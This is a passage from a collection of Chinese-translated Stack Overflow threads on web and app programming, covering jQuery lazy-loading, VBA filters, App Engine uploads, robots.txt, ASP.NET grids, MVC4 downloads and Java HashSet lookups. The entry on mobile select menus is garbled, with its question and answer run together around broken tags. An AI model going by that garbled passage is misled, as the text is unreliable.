                    return !element.loaded;
                });
                elements = $(temp);

                if (settings.load) {
                    var elements_left = elements.length;
                    settings.load.call(self, elements_left, settings);
                }
            })
            .attr("src", $self.data(settings.data_attribute));
    }
}); 
```

jQuery插件延迟加载

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-01T12:29:44.853

首先，您需要考虑何时要交换。例如，您可以在每次加载 div 标签时进行切换。在我的示例中，我只是使用了一个额外的数据字段“背景”，并且每当设置它时，图像就会被应用为背景图像。

然后你只需要使用创建的图像标签加载数据。并且不覆盖 img 标签，而是应用 css 背景图像。

这是代码更改的示例：

```
if (settings.appear) {
    var elements_left = elements.length;
    settings.appear.call(self, elements_left, settings);
}
var loadImgUri;
if($self.data("background"))
    loadImgUri = $self.data("background");
else
    loadImgUri  = $self.data(settings.data_attribute);

$("<img />")
    .bind("load", function() {
        $self
            .hide();
        if($self.data("background")){
            $self.css('backgroundImage', 'url('+$self.data("background")+')');
        }else
            $self.attr("src", $self.data(settings.data_attribute))

        $self[settings.effect](settings.effect_speed);

        self.loaded = true;

        /* Remove image from array so it is not looped next time. */
        var temp = $.grep(elements, function(element) {
            return !element.loaded;
        });
        elements = $(temp);

        if (settings.load) {
            var elements_left = elements.length;
            settings.load.call(self, elements_left, settings);
        }
    })
    .attr("src", loadImgUri );
} 
```

负载保持不变

```
$("#divToLoad").lazyload(); 
```

在本例中，您需要像这样修改 html 代码：

```
<div data-background="http://apod.nasa.gov/apod/image/9712/orionfull_jcc_big.jpg" id="divToLoad" />​ 
```

但如果您将开关更改为 div 标签，然后您可以使用“data-original”属性，它也会起作用。

这是一个小提琴示例：http: [//jsfiddle.net/dtm3k/1/](http://jsfiddle.net/dtm3k/1/)

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-12-01T02:17:32.007

**编辑**：下面的帖子是 2012 年的，现在已经过时了！

我这样做：

```
<div class="lazyload" style="width: 1000px; height: 600px" data-src="%s">
    <img class="spinner" src="spinner.gif"/>
</div> 
```

并加载

```
$(window).load(function(){

    $('.lazyload').each(function() {

        var lazy = $(this);
        var src = lazy.attr('data-src');

        $('<img>').attr('src', src).load(function(){
            lazy.find('img.spinner').remove();
            lazy.css('background-image', 'url("'+src+'")');
        });

    });

}); 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-06-05T09:43:51.567

我在插件的官方网站上找到了这个：

```
<div class="lazy" data-original="img/bmw_m1_hood.jpg" style="background-image: url('img/grey.gif'); width: 765px; height: 574px;"></div>

$("div.lazy").lazyload({
      effect : "fadeIn"
}); 
```

来源： http: [//www.appelsiini.net/projects/lazyload/enabled_background.html](http://www.appelsiini.net/projects/lazyload/enabled_background.html)

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2021-04-13T12:46:21.483

去年年中*2020* [web.dev](https://web.dev/lazy-loading-images/)发布了一篇文章，分享了一些新的方法来做到这一点，`IntersectionObserver`在撰写本文时，所有主流浏览器都支持这个答案。这将允许您在等待图像到达视口边缘然后加载它时使用重量非常轻的背景图像或背景颜色占位符。

CSS

```
.lazy-background {
  background-image: url("hero-placeholder.jpg"); /* Placeholder image */
}

.lazy-background.visible {
  background-image: url("hero.jpg"); /* The final image */
} 
```

Javascript

```
document.addEventListener("DOMContentLoaded", function() {
  var lazyBackgrounds = [].slice.call(document.querySelectorAll(".lazy-background"));

  if ("IntersectionObserver" in window) {
    let lazyBackgroundObserver = new IntersectionObserver(function(entries, observer) {
      entries.forEach(function(entry) {
        if (entry.isIntersecting) {
          entry.target.classList.add("visible");
          lazyBackgroundObserver.unobserve(entry.target);
        }
      });
    });

    lazyBackgrounds.forEach(function(lazyBackground) {
      lazyBackgroundObserver.observe(lazyBackground);
    });
  }
}); 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-03-05T20:50:41.110

我创建了一个“延迟加载”插件，它可能会有所帮助。这是在您的情况下完成工作的一种可能方法：

```
$('img').lazyloadanything({
    'onLoad': function(e, LLobj) {
        var $img = LLobj.$element;
        var src = $img.attr('data-src');
        $img.css('background-image', 'url("'+src+'")');
    }
}); 
```

它像 maosmurf 的示例一样简单，但仍然为您提供了在元素出现时触发事件的“延迟加载”功能。

[https://github.com/shrimpwagon/jquery-lazyloadanything](https://github.com/shrimpwagon/jquery-lazyloadanything)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-04-16T16:28:15.017

有人问这个问题已经有一段时间了，但这并不意味着我们不能在 2020 年分享其他答案。这是一个很棒的 jquery 插件：[jQuery Lazy](http://jquery.eisbehr.de/lazy/)

Lazy的基本用法：

**HTML**

```
<!-- load background images of other element types -->
<div class="lazy" data-src="path/to/image.jpg"></div>
enter code here 
```

**JS**

```
 $('.lazy').Lazy({
    // your configuration goes here
    scrollDirection: 'vertical',
    effect: 'fadeIn',
    visibleOnly: true,
    onError: function(element) {
        console.log('error loading ' + element.data('src'));
    }
}); 
```

并且您的背景图像是延迟加载的。就这样！

要查看真实示例和更多详细信息，请查看此链接[lazy-doc](http://jquery.eisbehr.de/lazy/example_load-background-images)。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-06-02T23:47:44.943

我必须为我的**响应式网站**处理这个问题。**对于相同的元素**，我有许多不同的背景来处理不同的屏幕宽度。我的解决方案非常简单，将所有图像都限制在一个 CSS 选择器中，例如“zoinked”。

逻辑：

如果用户滚动，则加载具有相关背景图像的样式。完毕！

这是我在一个我称之为“zoinked”的库中写的，我不知道为什么。刚刚发生好吗？

```
(function(window, document, undefined) {   var Z = function() {
    this.hasScrolled = false;

    if (window.addEventListener) {
      window.addEventListener("scroll", this, false);
    } else {
      this.load();
    }   };
     Z.prototype.handleEvent = function(e) {
    if ($(window).scrollTop() > 2) {
      this.hasScrolled = true;
      window.removeEventListener("scroll", this);
      this.load();
    }   };
     Z.prototype.load = function() {
    $(document.body).addClass("zoinked");   };
     window.Zoink = Z; 
})(window, document); 
```

对于 CSS，我将拥有像这样的所有样式：

```
.zoinked #graphic {background-image: url(large.jpg);}

@media(max-width: 480px) {.zoinked #graphic {background-image: url(small.jpg);}} 
```

我的技术是在用户开始滚动后立即加载顶部图像之后的所有图像。如果你想要更多的控制，你可以让“zoinking”更智能。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-08-29T18:50:24.897

> 使用上述插件延迟加载图像使用将侦听器附加到滚动事件或使用 setInterval 的传统方式，并且性能非常低，因为每次调用 getBoundingClientRect() 都会强制浏览器[重新布局](https://gist.github.com/paulirish/5d52fb081b3570c81e3a)整个页面，并且会引入相当大的卡顿到您的网站。

使用**[Lozad.js](https://github.com/ApoorvSaxena/lozad.js)**（只有 569 字节，没有依赖关系），它使用[InteractionObserver](https://developers.google.com/web/updates/2016/04/intersectionobserver)来高效地延迟加载图像。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-01-09T05:07:58.443

我知道这与图像加载无关，而是我在其中一项工作面试测试中所做的。

HTML

```
<div id="news-feed">Scroll to see News (Newest First)</div> 
```

CSS

```
article {
   margin-top: 500px;
   opacity: 0;
   border: 2px solid #864488;
   padding: 5px 10px 10px 5px;
   background-image: -webkit-gradient(
   linear,
   left top,
   left bottom,
   color-stop(0, #DCD3E8),
   color-stop(1, #BCA3CC)
   );
   background-image: -o-linear-gradient(bottom, #DCD3E8 0%, #BCA3CC 100%);
   background-image: -moz-linear-gradient(bottom, #DCD3E8 0%, #BCA3CC 100%);
   background-image: -webkit-linear-gradient(bottom, #DCD3E8 0%, #BCA3CC 100%);
   background-image: -ms-linear-gradient(bottom, #DCD3E8 0%, #BCA3CC 100%);
   background-image: linear-gradient(to bottom, #DCD3E8 0%, #BCA3CC 100%);
   color: gray;
   font-family: arial;    
}

article h4 {
   font-family: "Times New Roman";
   margin: 5px 1px;
}

.main-news {
   border: 5px double gray;
   padding: 15px;
} 
```

JavaScript

```
var newsData,
    SortData = '',
    i = 1;

$.getJSON("http://www.stellarbiotechnologies.com/media/press-releases/json", function(data) {

   newsData = data.news;

   function SortByDate(x,y) {
     return ((x.published == y.published) ? 0 : ((x.published < y.published) ? 1 : -1 ));
   }

   var sortedNewsData = newsData.sort(SortByDate);

   $.each( sortedNewsData, function( key, val ) {
     SortData += '<article id="article' + i + '"><h4>Published on: ' + val.published + '</h4><div  class="main-news">' + val.title + '</div></article>';
     i++;    
   });

   $('#news-feed').append(SortData);
});

$(window).scroll(function() {

   var $window = $(window),
       wH = $window.height(),
       wS = $window.scrollTop() + 1

   for (var j=0; j<$('article').length;j++) {
      var eT = $('#article' + j ).offset().top,
          eH = $('#article' + j ).outerHeight();

          if (wS > ((eT + eH) - (wH))) {
             $('#article' + j ).animate({'opacity': '1'}, 500);
          }
    }

}); 
```

我按日期对数据进行排序，然后对窗口滚动功能进行延迟加载。

我希望它有帮助:)

[演示](http://jsfiddle.net/bhaumikmehta/agvt60vc/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-05-25T15:47:44.303

使用 jQuery，我可以加载图像并检查它的存在。将 src 添加到具有原始图像高度宽度的平面 base64 哈希字符串中，然后将其替换为所需的 url。

```
$('[data-src]').each(function() {
  var $image_place_holder_element = $(this);
  var image_url = $(this).data('src');
  $("<div class='hidden-class' />").load(image_url, function(response, status, xhr) {
    if (!(status == "error")) {
      $image_place_holder_element.removeClass('image-placeholder');
      $image_place_holder_element.attr('src', image_url);
    }
  }).remove();
}); 
```

当然，我使用并修改了一些堆栈答案。希望它可以帮助某人。

# vba - 查找高级过滤条件的所有组合

> ID：12014607
> 
> 赞同：1
> 
> 时间：2012-08-18T00:03:36.893
> 
> 标签：vba, excel, filter, permutation

我进行了广泛的搜索，发现了大量关于排列的信息，但我想不出一个好的方法来适应它们。它令人沮丧，因为我认为答案并不难，但我似乎无法靠自己到达那里。

我正在尝试将包含选择标准的单元格范围转换为高级过滤器可以读取的范围。选择标准的范围如下所示：

![原始选择标准](../Images/6513ae97f326f516fd9ca5e20bf22f52.png)

问题是，高级过滤器将每一行作为一个单独的过滤器集进行评估。逻辑看起来像这样：

```
[awake AND bob AND cat AND earth AND yes] OR [sleeping AND sally AND dog AND earth AND yes] OR ... OR [martha]. 
```

这是高级过滤器应该工作的方式，但我需要它像自动过滤器一样工作，我将遍历每个字段并检查每个过滤器标准。逻辑应该如下所示：

```
[awake OR sleeping] AND [bob OR sally OR george OR martha] AND [cat OR dog OR bird] AND [earth] AND [alive] 
```

在阅读了文档和多个论坛之后，我能找到的唯一方法是在单独的行上生成可能的选择标准的每个组合。新的选择标准范围应如下所示：

![工作选择标准](../Images/b9666f3fb3741b0a3b84ad828d43be85.png)

我已经通过手动设置选择标准范围对此进行了测试，它可以正常工作，但我无法弄清楚自动化它的代码。这是我到目前为止所做的 - 开始还可以，但很快就会开始重复并丢失某些排列：

```
 If UBound(numRows) > 1 Then

    With Worksheets("fltr")
        .Range(.Cells(4, 1), .Cells(4, UBound(numRows))).Copy Destination:=Worksheets("afltr").Range("A1")
    End With

    'Determine number of rows needed for Advanced filter
    numPermute = numRows(1)
    For dstCol = 2 To UBound(numRows)
        numPermute = numPermute * numRows(dstCol)
    Next dstCol

    'Copy all permutations to advanced filter
    For dstCol = 1 To UBound(numRows)
        If thisRow > numRows(dstCol) Then
        thisRow = 2
        For thisGrp = 1 To numRows(dstCol)
            andSpltPos = 1
            For numRepeat = 1 To numPermute / numRows(dstCol)
                sbstFltrItms = Worksheets("fltr").Cells(4 + thisGrp, dstCol).Value 'MOD Problem?
                Worksheets("afltr").Cells(thisRow, dstCol).Value = sbstFltrItms
                thisRow = thisRow + 1
            Next numRepeat
        Next thisGrp
    Next dstCol

End If 
```

非常感谢一些帮助，无论是生成正确的排列还是使高级过滤器以其他方式工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:03:20.470

这对我有用。我将工作表置于“显示公式”模式（Ctrl+~），这样您就可以看到公式...要过滤的列表在 A7:B14 中，标准范围是 A3:B4。

![在此处输入图像描述](../Images/120d34e92f41fa2cb8c943b835a8a5a3.png)

应用过滤器后，我只得到一行（“B”，“val2”）。

# java - 从 Java 到 Python webapp2 的 HTTPPost 多部分（上传文件）

> ID：12014609
> 
> 赞同：7
> 
> 时间：2012-08-18T00:03:42.180
> 
> 标签：java, android, python, google-app-engine, flask

我正在尝试将文件上传到 GAE - 服务器端代码：

```
 class UploadHandler(blobstore_handlers.BlobstoreUploadHandler):
    def post(self):
            upload_files = self.get_uploads('file')  
            blob_info = upload_files[0] # When using flask, request.files[0] gives correct output.
            self.response.out.write('/serve/%s' % blob_info.key()) 
```

使用 HTML，我可以让它工作：

```
upload_url = blobstore.create_upload_url('/upload')
    self.response.out.write('<html><body>')
    self.response.out.write('<form action="%s" method="POST" enctype="multipart/form-data">' % upload_url)
    self.response.out.write("""Upload File: <input type="file" name="file"><br> <input type="submit"
        name="submit" value="Submit"> </form></body></html>""") 
```

但我必须能够从 Java 发出多部分发布请求。我有一个在 openshift *（`request.files[0]`而不是烧瓶）*上托管的烧瓶项目，其中 Java 代码似乎可以工作：

```
HttpParams params = new BasicHttpParams();
params.setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
DefaultHttpClient mHttpClient = new DefaultHttpClient(params);
HttpPost httppost = new HttpPost(getString(R.string.url_webservice) + "/upload");
MultipartEntity multipartEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
multipartEntity.addPart("file", new FileBody(new File(path)));
httppost.setEntity(multipartEntity);
mHttpClient.execute(httppost, new MyUploadResponseHandler(path)); 
```

但是当我在 GAE 上运行它时，我`upload_files[0]`在上传时得到了一个超出范围的索引 - 错误在哪里？我似乎找不到它，代码与我确认可以工作的以下代码非常相似*（flask，openshift）*：

```
def upload_file():
if request.method == 'POST':
    file = request.files['file']
    ... 
```

更新：完整的错误日志：

```
list index out of range
Traceback (most recent call last):
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line  1511, in __call__
    rv = self.handle_exception(request, response, e)
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1505, in __call__
   rv = self.router.dispatch(request, response)
   File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1253, in default_dispatcher
return route.handler_adapter(request, response)
   File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1077, in __call__
return handler.dispatch()
   File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 547, in dispatch
return self.handle_exception(e, self.app.debug)
   File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 545, in dispatch
return method(*args, **kwargs)
   File "myapp.py", line 22, in post
blob_info = upload_files[0]
 IndexError: list index out of range 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T05:28:22.643

`blobstore.create_upload_url('/upload')`尚未在 java 中生成 url `/upload` ，/upload 是您尝试发布以查看从该处理程序生成的 html 的位置，您将看到表单的操作 url 不同。

您可以让处理程序使用您的 java 代码获取然后用于发布的上传 url 进行响应。

# android - 在 Android 应用中实现日历

> ID：12014610
> 
> 赞同：0
> 
> 时间：2012-08-18T00:03:54.397
> 
> 标签：android, calendar

有什么方法可以将 Android 日历应用程序实现到我正在制作的应用程序中？我想要它，这样我就可以在月视图和周视图之间切换，就像在日历应用程序中一样。我必须全部编写代码还是谷歌提供一些东西来帮助我做到这一点？

嘿，伙计们，我发现了一些可以帮助正在查看此线程的任何人的东西

[https://github.com/karabaralex/android-calendar-view/blob/master/README.md](https://github.com/karabaralex/android-calendar-view/blob/master/README.md)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:20:07.330

据我所知，你必须自己实现它。

但不要忘记 Android 是开源的，您可以随时查看日历源代码并重用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-20T23:11:21.350

嘿，伙计们，我发现了一些可以帮助正在查看此线程的任何人的东西

[https://github.com/karabaralex/android-calendar-view/blob/master/README.md](https://github.com/karabaralex/android-calendar-view/blob/master/README.md)

# multithreading - 使用 Core Data 保存后台位置更新

> ID：12014612
> 
> 赞同：0
> 
> 时间：2012-08-18T00:04:23.790
> 
> 标签：multithreading, core-data, core-location

我正在尝试设置一个应用程序，以便有一个后台任务，其中 locationManager 接收然后使用核心数据存储的更新。这是我用来将 locationManager 作为后台任务运行的代码：

```
(void)viewDidLoad
{
    [super viewDidLoad];

timerAndMap = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:^{
            [self endDate];
     }];

        if(nil == locationManager) {
        locationManager = [[CLLocationManager alloc] init];
        }

    locationManager.delegate = self;
    locationManager.distanceFilter = 500;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    [locationManager startUpdatingLocation];

  [[UIApplication sharedApplication] endBackgroundTask:timerAndMap];

} 
```

但是，我遇到的问题是弄清楚如何使委托方法成为后台线程的一部分。当 locationManager 调用 didUpdateToLocation 时，我想将新位置的经度、纬度和日期保存为临时 managedObjectContext 中实体的属性，然后与我在主线程上建立的 ManagedObjectContext 合并（据我所知，当应用程序运行时）在后台运行的新核心数据实体无法存储到我的主线程 ManagedObjectContext）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:19:55.783

位置大约每秒更新一次，用坐标创建一个 NSMutableArray，保存一个坐标列表，当它到达一个点时，用可变数组中的坐标创建一个 NSArray，清除 NSMutableArray，将 NSArray 实例传递给后台线程，并执行保存。

编辑：基于新信息：CLLocationManager 的方法是异步的。如果这是您要完成的任务，您可以做的是分派一个后台块并在您的委托回调的块内创建您的实体。您甚至可以管理自己的串行 dispatch_queue 来执行此操作。

考虑到你，仅仅因为你正在做某事它的背景并不能使它有效。每次获得新位置（可能每 1-2 秒）时，您仍会调用 save。写入持久存储是昂贵的。

# testing - 在线测试我的网站

> ID：12014614
> 
> 赞同：0
> 
> 时间：2012-08-18T00:04:30.267
> 
> 标签：testing

我如何在线测试我的网站（在它公开之前）并且除了我之外没有人可以看到它？

我知道我可以添加密码，但我不希望谷歌索引它（在它真正公开之前）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:10:08.790

为了防止谷歌将其编入索引，请在您的脑海中使用此元标记：
`<meta name="robots" content="noindex,nofollow" />`
这会告诉搜索引擎您不希望您的页面出现在搜索结果中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-15T09:38:55.760

将`robots.txt`文件添加到您的网站。

```
User-agent: *
Disallow: / 
```

将上面的文本保存到一个名为 的文本文件`robots.txt`中，并将其上传到您的网站根目录。

通过使用它，任何行为良好的爬虫都不会读取您的网站，任何行为良好的搜索引擎都不会索引您的网站。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T00:07:37.670

根据您网站的设计方式（PHP、Python、Ruby），您必须建立一个 Web 服务器。最典型的配置是[AMP](http://en.wikipedia.org/wiki/LAMP_%28software_bundle%29)，它代表 Apache、MySQL 和 PHP/Python。（通常这在 Linux 上运行，但它也可以在 Windows 下运行。）

Ruby on Rails 带有自己的内置 Web 服务器。大多数 Python Web 框架（Django、CherryPy、Pylons）也是如此。

# asp.net - Gridview - 数据源：空与无

> ID：12014616
> 
> 赞同：0
> 
> 时间：2012-08-18T00:04:36.500
> 
> 标签：asp.net, vb.net

我正在开发一个遗留应用程序，当绑定到 DataSource 的数据表为空（即没有行）时，DataSource 反而绑定到 Nothing。

我希望这充其量只能带来微不足道的性能提升，而且我想不出任何其他理由这样做。

有什么我想念的吗？没有行的数据源与为空的数据源之间是否存在行为或显着的性能差异？

更新：这些列是在 aspx 中定义的，而不是自动生成的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:13:26.533

根据您指定列定义的方式（即：动态生成或预先生成它们），您可能在网格布局中存在视觉差异（没有任何源的网格显然不会自动生成列）。但是从内存管理和性能的角度严格来说，我认为空数据集/数据表的占用空间会更低，因为您不会导致网格触发其数据集初始化事件。

从总体上看，我认为您实际上不会看到太多可测量的时间/内存差异，除非您创建空数据集/数据表的例程需要大量时间。

我很想听听其他人对这个话题的看法。

# asp.net-mvc-4 - 我可以使用 MVC4 的 ApiController 实现文件下载吗？

> ID：12014627
> 
> 赞同：9
> 
> 时间：2012-08-18T00:06:27.527
> 
> 标签：asp.net-mvc-4

使用常规控制器，我可以通过返回 FileResult 来做到这一点。这似乎不适用于 ApiController。可以做到吗？这甚至是正确的做法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-18T19:34:24.580

尝试这个。

```
[HttpGet]    
public HttpResponseMessage Get()
    {
        var file = HttpContext.Current.Server.MapPath("~/Images/accent.png");
        var stream = new FileStream(file, FileMode.Open);
        var content = new HttpResponseMessage(HttpStatusCode.OK)
                         {
                             Content = new StreamContent(stream)
                         };
        content.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        return content;
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-09-25T13:20:24.837

由于[这个问题](https://stackoverflow.com/questions/12975886/how-to-download-a-file-using-web-api-in-asp-net-mvc-4-and-jquery "如何在 ASP.NET MVC 4 和 jquery 中使用 web api 下载文件")，我有这个工作。

```
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Web.Http;

namespace Web.Controllers
{
    //usage: /download/report

    [RoutePrefix("download")]
    public class DownloadController : ApiController
    {
        [HttpGet("report")]
        public HttpResponseMessage Report()
        {
            using (var service = new Client())
            {
                var report = service.BuildReport();

                return DownloadResponse(report, "Report.csv");
            }
        }

        private static HttpResponseMessage DownloadResponse(string content, string fileName)
        {
            var downloadContent = new StringContent(content);

            var mediaType = new MediaTypeHeaderValue("application/octet-stream");
            var disposition= new ContentDispositionHeaderValue("attachment") { FileName = fileName };

            downloadContent.Headers.ContentType = mediaType;
            downloadContent.Headers.ContentDisposition = disposition;

            var result = new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = downloadContent
            };

            return result;
        }
    }
} 
```

# jquery - 使用什么，MooTools morph，jQuery animate，jq hover() 或其他什么？

> ID：12014630
> 
> 赞同：0
> 
> 时间：2012-08-18T00:06:34.937
> 
> 标签：jquery, mootools

我在一个容器中有一组元素，它们在页面加载时都隐藏了。它们被我想动画悬停的负绝对位置隐藏。

我可以使用库 jq 或 moo

并试图在悬停效果上获得类似效果的网店 [https://chrome.google.com/webstore/category/home?utm_source=chrome-ntp-icon](https://chrome.google.com/webstore/category/home?utm_source=chrome-ntp-icon)

您可以看到扩展滑块导航的延迟（从侧面弹出）及其信息（从底部弹出）

这是非常简单的 moo 版本，没有延迟

[http://jsfiddle.net/BVjna/38/](http://jsfiddle.net/BVjna/38/)

通过使用 moo morph 或 jq animate 我遇到的问题是我必须列出容器内的每个 div，因为它们将具有不同的绝对位置。

我宁愿拥有一个应用于 .container 的类，并通过 css 对内部元素进行变形/动画处理，有点像 `.container.hovered .el1{top:0;}`但当然还有动画效果。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:26:34.517

我对 mootools 的经验绝对是 0，但我确实知道 jquery。这是一个非常简单的模仿效果。（虽然，我主要是基于谷歌的商店）。

[Rollover 悬停替换示例 @ jsFiddle](http://jsfiddle.net/qmnyH/4/)

这里的想法是不必计算正在滑过的 div 并处理它们的绝对位置，而是将它们放入单个容器中并展开。

这也解决了您将所有元素的起始位置对齐在同一点的问题，因此示例中的相对速度会产生手风琴效果（看起来像拉伸而不是滑动）。

如您所见，它也适用于多个控件。

**编辑：**我还添加了一个如何使主要内容滑开的示例（如谷歌）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-18T01:13:22.583

这是使用 CSS3 过渡的另一个选项。

[http://jsfiddle.net/davesters81/VMxyw/2/](http://jsfiddle.net/davesters81/VMxyw/2/)

但在旧浏览器中不起作用。但向您展示了您完全可以在没有 javascript 或 jQuery 的情况下实现这一目标。

# html - HTML 5：- 使用下拉菜单在移动设备上的行为在大多数移动浏览器上点击 <select>元素会显示一个可供选择的触摸友好菜单，而不是您通常在台式机/笔记本电脑浏览器上看到的指针友好下拉菜单。这将使</select> 非常适合用作导航菜单，而不是经常实现的

<select>外观。是否可以使用 下拉菜单在移动浏览器上实现与 ID：12014633 赞同：2 时间：2012-08-18T00:06:51.733 标签：html, css, w3c 回答 #1 赞同：2 时间：2012-08-18T00:14:02.077 您可以执行以下操作： 检测移动设备（基于大小，使用 WURFL 或其他工具）。如果是移动设备，隐藏标准 ul 下拉菜单，改为选择。如果您不喜欢选择的外观，可以执行以下操作： select { -webkit-appearance: none; background: url(some_nav_image.png) #ddd; }​ jsfiddle 示例：http: //jsfiddle.net/h9UyZ/ 老实说，如果样式正确，它们甚至可以用于主网站和移动设备，并且在所有情况下都能很好地工作。</select>

# c# - datagridview 行验证取消

> ID：12014638
> 
> 赞同：0
> 
> 时间：2012-08-18T00:07:45.217
> 
> 标签：c#, datagridview, event-handling

我在这里和其他网站上看到了几篇与我的问题/问题类似的帖子，但从未真正看到任何直接针对目标并给出好的答案的帖子（如果我在搜索中遗漏了一个，请指出它！ ）。如果这很长，请原谅我，但我想尽可能完整/准确地描述......提前感谢您的帮助！

我有一个带有并排 datagridviews (dgdApplications & dgdEligibleFiles) 的 Windows 窗体。dgdApplications 设置为 FullRowSelect 和验证 (CausesVailidation = true)。dgdEligibleFiles 包含一个文件列表和文件信息，以及一个复选框列 - 如果选中了一行，它所代表的文件将“分配”给 dgdApplications 中的选定行（dgdApplications 中的行/应用程序可能分配有许多文件） . 如果用户更改了他在 dgdEligibleFiles 中的分配（选中/未选中的一行/多行）而没有单击表单底部的保存按钮，然后单击 dgdApplications 中的另一行，我目前使用 dgdApplications_RowValidating 弹出一个消息框并验证用户想要继续新选择的应用程序/行而不保存更改。如果单击“否”按钮，我调用 e。取消留在原来的行。如果“是”，我想在新行上继续 dgdApplications_MouseClick，这将执行以下操作：清除 dgdEligibleFiles 中的复选框，检索 dgdApplications 中新选择的应用程序的文件列表，并更新底层中的选中/选择值绑定到 dgdEligibleFiles 的列表（后跟 dgdEligibleFiles.Refresh()）。

我的问题：当消息框显示在 dgdApplications.RowValidating 中并且用户选择“是”继续（放弃 dgdEligibleFiles 中的更改并转到 dgdApplications 中的新行）时，dgdApplications_MouseClick 不会执行并且 dgdEligbleFiles 中没有任何更改。如何让 dgdApplications_MouseClick 执行？

```
void dgdApplications_RowValidating(object sender, DataGridViewCellCancelEventArgs e)
{
    if (assgnmtChgd && (MessageBox.Show("You will lose unsaved changes - continue?", "", MessageBoxButtons.YesNo) == DialogResult.No))
    {
        e.Cancel = true;
        return;
    }
}

/// <summary>
/// Handles the selection of an application when it's datagridview row is clicked
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
private void dgdApplications_MouseClick(object sender, MouseEventArgs e)
{
    // Reset the DisplayAssignedOnly checkbox so all dgdEligibleFiles rows will be unhidden and displayed
    chkDispAssgndOnly.CheckState = CheckState.Unchecked;
    ClearFilesGrid();

    dgdApplications.CurrentRow.Selected = true;
    currentAppRowID = dgdApplications.CurrentRow.Index;
    currentAppRecID = (int)dgdApplications.CurrentRow.Cells["appIDColumn"].Value;
    dgdEligibleFiles.ClearSelection();
    dgdEligibleFiles.CurrentCell = null;
    MatchAssignedFiles(currentAppRecID);

    dgdEligibleFiles.Refresh();

    //Set the indicator showing that no assignments have been changed
    assgnmtChgd = false;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:50:57.390

错误是您的点击事件发生在 RowValidating 之前，因此您必须在另一个事件（例如 cellleave）中进行处理

```
private void dataGridView1_CellLeave(object sender, 
    DataGridViewCellEventArgs e)
{
//you can access to index column and row to do your process
    dataGridView1[e.ColumnIndex, e.RowIndex].Style
        .SelectionBackColor = Color.Empty;
} 
```

# java - Java：从 HashSet 中检索元素

> ID：12014641
> 
> 赞同：59
> 
> 时间：2012-08-18T00:07:51.477
> 
> 标签：java

希望有人能解释为什么我不能从`HashSet`.

考虑我`HashSet`包含正确覆盖`MyHashObjects`他们的`hashCode()`和方法的列表。`equals()`

我希望做的是`MyHashObject`自己构建一个，并将相关的哈希码属性设置为某些值。我可以使用该方法查询`HashSet`集合中是否存在“等效”对象。`contains()`因此，即使`contains()`2 个对象返回 true，它们也可能不是`==`true。

那么为什么没有`get()`类似于`contains()`工作原理的方法呢？

有兴趣了解此 API 决策背后的想法

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-08-18T00:09:49.570

如果您知道要检索的元素，那么您已经拥有该元素。`Set`给定一个元素，a 唯一要回答的问题是它是否`contains()`存在。

如果要对元素进行迭代，只需使用[`Set.iterator()`](http://docs.oracle.com/javase/7/docs/api/java/util/Set.html#iterator%28%29).

听起来你想要做的是为元素的等价类指定一个规范元素。您可以使用 a`Map<MyObject,MyObject>`来执行此操作。请参阅[this SO question](https://stackoverflow.com/questions/7436765/how-to-implement-a-canonicalizing-mapping-in-java)或[this one](https://stackoverflow.com/questions/3006923/retrieving-the-canonical-value-from-a-sett-where-t-has-a-custom-equals)进行讨论。

如果您真的确定要找到一个元素，该`.equals()`元素具有您必须使用的约束的原始元素`HashSet`，我认为您会坚持迭代它并检查`equals()`自己。API 不允许您通过其哈希码获取某些内容。所以你可以这样做：

```
MyObject findIfPresent(MyObject source, HashSet<MyObject> set)
{
   if (set.contains(source)) {
      for (MyObject obj : set) {
        if (obj.equals(source)) 
          return obj;
      } 
   }

  return null;
} 
```

蛮力和 O(n) 丑陋，但如果这是你需要做的......

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2015-06-05T07:52:51.913

你可以`HashMap<MyHashObject,MyHashObject>`代替`HashSet<MyHashObject>`.

